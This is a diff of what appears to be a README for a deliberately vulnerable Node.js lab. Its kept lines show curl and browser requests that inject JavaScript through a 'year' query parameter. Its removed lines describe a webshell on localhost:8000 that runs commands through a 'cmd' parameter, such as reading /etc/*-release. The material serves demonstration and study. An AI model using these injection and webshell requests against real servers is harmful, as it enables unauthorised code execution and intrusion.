@@ -22,10 +22,3 @@ JavaScript code can be injected via the `year` HTTP GET query using the followin
 2. curl -G --data-urlencode "year=res.write('<h1>hello world</h1>')" http://localhost:3000
 3. (using the browser) http://localhost:3000/?year=res.write('<h1>hello world</h1>')
 ```
-
-The payload will spawn a webshell which you can access from `http://localhost:8000`. You can specify commands by appending an HTTP GET query called `cmd`
-```
-1. curl -G --data-urlencode "cmd=<command>" http://localhost:8000
-2. curl -G --data-urlencode "cmd=cat /etc/*-release" http://localhost:8000
-3. (using the browser) http://localhost:8000/?cmd=cat /etc/*-release
-```
